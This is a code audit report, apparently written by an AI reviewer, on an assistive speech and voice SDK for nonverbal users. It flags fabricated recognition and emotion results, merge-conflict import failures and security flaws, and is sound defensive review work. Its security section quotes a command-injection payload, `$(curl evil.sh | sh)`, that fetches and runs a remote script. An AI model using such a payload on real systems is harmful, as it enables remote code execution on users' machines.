# Medical Grade Code Review Report
### Christman-Sound — Unified Audio, Voice & Speech SDK

**Reviewer:** Claude (claude-fable-5) · Medical-Grade + Cardinal-Rules protocol
**Session date:** 2026-07-20
**Codebase:** `/Users/EverettN/Christman-Sound` (canonical copy — hardening here propagates to every being)
**Patient population:** Nonverbal / AAC users (AlphaVox), plus trauma, dementia, senior, and child-facing beings downstream
**Review type:** Full Clinical Audit — 81 source files, every line read, findings independently re-verified
**Coverage:** 100% of source (6 parallel medical-grade auditors, ~12,000 lines) + independent `ast.parse` verification of every syntax claim and spot-checks of the load-bearing Rule 13 findings

---

## The one-paragraph truth

As it sits on disk right now, Christman-Sound does **not** run, and the parts that *do* run largely fabricate their results. Five files fail to import at all (unresolved git merge conflicts and an indentation error) — including `core.py`, the 2,663-line heart of the SDK. Behind the files that parse, the three things this SDK exists to do — **hear** the user, **read their emotion**, and **speak in their voice** — are, in every reachable code path, either simulated with `random.choice`, mislabeled by a model wired to the wrong output classes, or replaced by a looped copy of the user's own reference clip. This is not a "polish" review. This is a "the engine is not connected to the wheels, and the speedometer is drawn on with marker" review. **Verdict: NOT SAFE FOR PATIENT USE** — and it can't be, because it cannot currently start. The good news underneath: the *architecture* is genuinely sound in several places, the honest fallback instincts are right, and a defined, finite list of fixes gets this to a real, honest v1. Everything below is evidence, not opinion.

---

## CRITICAL — Blocks import (nothing runs until these are fixed)

Independently confirmed with `ast.parse` — these are not judgment calls, they are hard `SyntaxError`s:

1. **`core.py:67`** — unresolved merge conflict (`<<<<<<< HEAD` … `>>>>>>> 1da612da…`). `SyntaxError: invalid decimal literal`. The entire SDK core — ToneScore engine, mic capture, synthesis chain, crisis/Hold-Space logic, nonverbal engine — cannot import. Every being that imports core.py crashes on load.
2. **`setup.py:19`** — merge conflict. `pip install -e .` fails; the package cannot be installed.
3. **`crypto_bridge.py:15`** — `IndentationError` (class body at column 0), and it imports `christman_crypto`, which exists nowhere in the repo. The "ML-KEM-768 voicepack encryption" is 100% non-functional while its log lines claim success.
4. **`CHRISTMAN_EAR_CANAL/__init__.py:34`** — merge conflict, `unmatched ']'`. The **entire adapter layer** (EAR/SPEAK/TONE/OCR that beings call) cannot import.
5. **`christman_preflight.py:205`** — merge conflict. The tool whose *entire job* is to catch broken modules is itself broken, and there are 3 more duplicate broken copies (`christman_preflight0/2/3.py`) in the repo root.

All five trace to one bad merge (`1da612da…`) that was then copied around while already broken.

---

## CRITICAL — Patient-safety fabrication (Rule 13 violations in live paths)

These files parse, but do the wrong thing. Each is quoted verbatim from the file.

### Hearing the user — every ASR path returns fake words
- **`audio/enhanced_speech_recognition.py:195` & `:256`** — `recognized_text = random.choice(sample_phrases)`. `process_audio_data()` throws the real audio away (comment: "Placeholder") and returns a **random canned sentence** with fabricated confidence `0.7 + random()*0.25` — and the returned dict carries **no** simulation flag. A nonverbal user's actual utterance is answered with an invented sentence presented as recognition.
- **`integration/speech_integration.py:67`** — imports `get_speech_recognition_engine`, but the module exports `get_real_speech_recognition_engine`. The `ImportError` is swallowed; the "real" engine silently never loads and the SDK falls through to the simulator above. This is *how* the fake becomes the production path.
- **`audio/speech_recognition_engine.py:18`** — `import speech_recognition_engine as sr` — the module imports **itself** instead of the `speech_recognition` library. It has never executed successfully. When "fixed," its backend is `recognize_google()` — Google **cloud** ASR: patient audio leaving the device, offline-first + data-sovereignty violation.
- **Net:** there is **no VOSK and no Whisper anywhere in this SDK.** In every reachable path, "speech recognition" is random canned phrases. *(This is also the honest answer to the earlier Whisper question: there is no Whisper model here to turn up.)*

### Reading emotion — the model is wired to the wrong labels
- **`tone/tonescore_engine.py:144` & `tone/tone_analyzer.py:136`** — a **4-class** emotion model (`superb/wav2vec2-base-superb-er`) has a **7-label** list zipped onto its outputs by index. A **sad** user is reported as **joy**; a **calm** user as **anger**. The two labels that gate grief/Takotsubo detection ("sadness"/"fear") are permanently `0.0` — so the audio path to Sacred Hold Space is dead code.
- **`tone/christman_tone_engine_v2.py:31`** — same 4-class model zipped onto an **11-label** list: the model's *angry* is reported as **"proud"**, its *sad* as **"teasing"**. The `HOLD_SPACE` safety trigger keys on labels the model can never emit.
- **On failure, all of these return flat fabricated scores** (`0.14` per label) formatted exactly like real inference, no `degraded` flag — and the tie-break makes **"anger" the default reported emotion for every input, silently, forever.** For a system labeling vulnerable people's emotional states, mislabeling calm as anger is a direct safety risk.
- **Fabricated benchmarks:** `tonescore_engine.py:102` docstring claims "Anger: 94% | Joy: 91% …" and "fine-tuned on CREMA-D + RAVDESS" — no evaluation code exists anywhere, and the model it loads is IEMOCAP-trained. A clinician reading that docstring would trust numbers that were never measured.

### Speaking — the user hears everything except their own words
- **`engines/gpt_sovits_engine.py:118`** — the "primary synthesis engine" logs *"loader is not yet wired; staying in fallback mode"* and sets `self.model = None` **even when a checkpoint exists.** Every synthesis returns the user's **reference clip looped** to text-length (or a 440 Hz sine tone if no reference) — labeled a successful result with `naturalness_mos = 4.5`. A nonverbal user presses "speak" and hears their training clip, not their sentence.
- **`engines/base_synthesizer.py:99`** — `return {"speaker_similarity": 0.95, "naturalness_mos": 4.5, "clarity": 0.90}` — hardcoded quality scores stamped onto every result, including the looped-clip and sine-tone output.
- **`synthesis/voice_synthesis.py:246`** — emotion tag is prepended to the spoken text, so the device literally says *"With strong fear. Help me."* aloud.
- **`nonverbal/cochlear_sync_tts.py:189`** — `tts()` returns the literal bytes `b"AUDIO_DATA_PLACEHOLDER"`, base64-encoded and streamed to avatar clients as real `"audio"`.

### Interpreting nonverbal input — random meaning, put in the user's mouth
- **`nonverbal/engine_temporal.py:370`** — when the on-disk model is a `.pkl` without a `.predict`, the engine returns a **random gesture label** with **random confidence 0.6–0.95**, looks up a message ("I need help." / "I'm scared."), and speaks it — logging it as `successful=True`. This is the single most dangerous line in the codebase.
- **`nonverbal/nonverbal_engine.py`** — declares `confidence_threshold = 0.6` and **never reads it** (grep-confirmed zero reads). There is no minimum-confidence gate anywhere; injects deliberate `random.uniform(-0.05, 0.05)` noise into confidence; and its "self-learning" loop can only ever *decay* confidence on the gestures the user relies on most (no code path ever passes `success=True`).
- **No override, no undo, no "that's not what I meant"** path exists anywhere. A nonverbal user cannot correct a misinterpretation.

### Security — three real holes
- **`christman_ocr_shared.py:242`** — `os.system(f'say "{safe_text}"')` where `safe_text` is OCR'd from arbitrary screens/documents; escaping only quotes. A scanned page containing `$(curl evil.sh | sh)` executes on the machine — on the exact offline fallback path a vulnerable user relies on. **Command injection via the words on a page.**
- **`timbre/voicepack.py:247`** — `# TODO: Implement encryption` → the "encryption" is `shutil.copy` to a `.encrypted` filename, logged as "Voicepack encrypted." A vulnerable user's voice biometrics sit in plaintext while metadata and logs claim they're encrypted. Pickle-loading voicepacks (`timbre_modeler.py:436`) is also arbitrary-code-execution on any shared/downloaded pack.
- **`christman_dsp.c:114`** — `for (size_t i = 0; i < length - lag; i++)` underflows to ~2^64 on any audio frame shorter than the LPC order → out-of-bounds read / segfault on short buffers.

---

## WARNING — Fix before production (representative; full list in appendix data)

- **`core.py:1131`** — VAD counts *leading* silence, so a slow-to-start speaker gets cut off before saying anything — the opposite of the docstring's "never cut off… critical for nonverbal users."
- **`voice_capture_client.py:189`** — the local-TTS fail-safe calls `os.system` with **`os` never imported** → `NameError` at the exact moment the network path already failed. The safety net has a hole in it.
- **`audio/audio_processor.py:87`** — `np.mean(audio, axis=0)` averages across *frames*, collapsing any stereo file to 2 samples. Wrong axis silently destroys audio.
- **`base_synthesizer.py:93`** — the "normalize to avoid clipping" line sets peak to `1.01` — it *guarantees* clipping.
- **Voice biometrics over plaintext `ws://`** (`voice_capture_client.py:168`) to a config-overridable endpoint.
- **Every `.keras`/`.pkl`/voicepack loaded via `pickle`** — six sites in `engine_temporal.py`, plus timbre — arbitrary code execution surface.
- **Unbounded temp/cache growth** of vulnerable users' audio in `/tmp/christman_sdk`, `voice_cache/`, `static/audio/` — no eviction, world-readable, a privacy issue and a disk-full endpoint on an AAC tablet.
- **No locks anywhere** on shared mutable state in the nonverbal engine, orchestrator, and capture callbacks (learning thread mutates maps mid-classification).
- **`_init_.py`** (single underscores) means the SDK root has no real `__init__.py`; `import christman_voice_sdk` yields an empty namespace and every documented export is absent at runtime.
- **Duplicate/drifting loggers** (root, engines/, timbre/, utils/) with three different behaviors — only `engines/logger.py` handles both import modes.

---

## Fail-safe posture summary (the pattern that matters)

The recurring failure mode across the whole SDK is **SILENT_FAIL that fabricates success** — the most dangerous posture for this population, because a caregiver sees green while the user is unheard or misspoken.

| Layer | When it fails | What it actually does | Posture |
|---|---|---|---|
| core.py / adapters / setup / preflight | always (won't parse) | import crash | CRASH (at least loud) |
| Speech recognition | any real audio | random canned phrase, no flag | **SILENT_FAIL (fabricated)** |
| Emotion analysis | model load/infer fails | flat scores → "anger" default, no flag | **SILENT_FAIL (fabricated)** |
| Voice synthesis | model not wired (always) | user's looped reference clip, MOS 4.5 | **SILENT_FAIL (fabricated)** |
| Nonverbal interpretation | pkl model present | random label @ 0.6–0.95 confidence, spoken | **SILENT_FAIL (fabricated)** |
| VAD capture | slow speaker | recording ends before speech | SILENT_FAIL |
| Local TTS fail-safe | Derek offline (macOS) | NameError (`os` unimported) | CRASH inside the safety net |
| OCR → local TTS | malicious page text | shell command injection | UNSAFE |

The genuinely safe defaults that *do* exist (and should be the template): `real_speech_recognition.py:243` tells the truth ("I detected speech but need a speech recognition API to understand it"); `CHRISTMAN_EAR_CANAL/SPEAK.py` returns honest `status/engine/error` dicts on every fallback.

---

## 🏆 Breakthroughs — what is genuinely good and must be kept

This is not a bad codebase written by someone careless. It is a **well-architected codebase with its real engines unplugged and placeholders left in the sockets.** Named, with location:

- **`christman_dsp.c` — the YIN pitch detector and Levinson-Durbin LPC** (lines 41–146). Real, correct, textbook DSP written in bare C to kill the librosa dependency — exactly the right offline-first sovereignty move. It just was never compiled or wired to Python.
- **`written_tone.py:16` — the NON-CLAIMS docstring block.** "This is a heuristic… NOT a clinical or forensic instrument… explainable feature counts, not calibrated probabilities." **This is Rule 13 embodied in code.** It should be the retrofit template for every analysis module in the SDK.
- **`utils/presence_guide.py` + `utils/grounder.py`** — content that audits *the AI's own output* for toxic positivity and premature fixing, with explicit "not clinical care" disclaimers and consent-first design ("the caller MUST NOT invent a companion"). Cardinal Rule 14 cited *in the code*.
- **`voice_capture_client.py:59` — `extract_frequency_signature`** — the one fully real DSP path in the capture layer: autocorrelation F0, spectral centroid, formant picking, ZCR. Solid, dependency-light, honest.
- **`real_speech_recognition.py:147` — the audio callback discipline** (copy-then-queue, no processing in the device callback). The right real-time architecture — it just needs a real engine behind it.
- **The nonverbal taxonomy treats stimming as communication and rapid-blink as urgent overwhelm** (`nonverbal_engine.py:691`) — genuinely disability-informed vocabulary design.
- **`gpt_sovits_engine.py` never-silence instinct** — the design goal that the user always hears *something* rather than dead air is the right AAC instinct. The failure is that the honesty lives in log lines instead of the returned result.
- **`preflight.py:266` `extract_root_cause`** — a genuinely excellent failure taxonomy (circular vs internal-broken vs pip-missing, each with an actionable next command).

---

## Cardinal Rules scorecard

- **Rule 1 (It has to work):** ❌ — does not import; core paths fabricate.
- **Rule 6 (Fail loud/honest):** ❌ — dominant pattern is silent fabrication with a success flag.
- **Rule 12 (Security):** ❌ — command injection, plaintext "encryption," pickle RCE.
- **Rule 13 (Absolute honesty):** ❌ — fake ASR, mislabeled emotion, fabricated MOS/accuracy, placeholder audio presented as real. This is the central finding.
- **Rule 15 (No unapproved spend):** ✅ (mostly) — **no paid APIs** (no ElevenLabs/OpenAI/Polly) in the code. Flags: `gtts` (free Google *cloud* TTS) in several paths and `setup.py`, and `recognize_google` — cloud dependencies and offline-first violations, not billing violations.

---

## Reviewer's Clinical Verdict

**NOT SAFE FOR PATIENT USE.** Today it cannot start; if the five import blockers were fixed this afternoon, it would start and then *lie* — hearing random phrases, labeling sad users as joyful, and speaking a looped clip instead of the user's words, all reported as success. For a nonverbal person who cannot correct any of it, that is worse than an obvious crash.

But this is a **fixable** codebase, and the fix list is finite and ordered. The bones are good; the honesty instincts are already in the repo (written_tone.py, presence_guide.py, the SPEAK adapter). The work is: (1) resolve the 5 conflicts so it imports, (2) rip out every `random.choice`/placeholder/hardcoded-metric and replace with either a real engine or an honest `unavailable` error, (3) fix the emotion label mapping to read `model.config.id2label`, (4) wire one real local TTS + one real local ASR (VOSK or faster-whisper — both free, offline, Rule-15-clean), (5) enforce the confidence threshold and add a user override, (6) close the three security holes. Nothing on that list requires a paid service or an architecture rewrite.

---

*© The Christman AI Project | Luma Cognify AI · "How can we help you love yourself more?"*
*Reviewed like a life depended on it — because it does.*
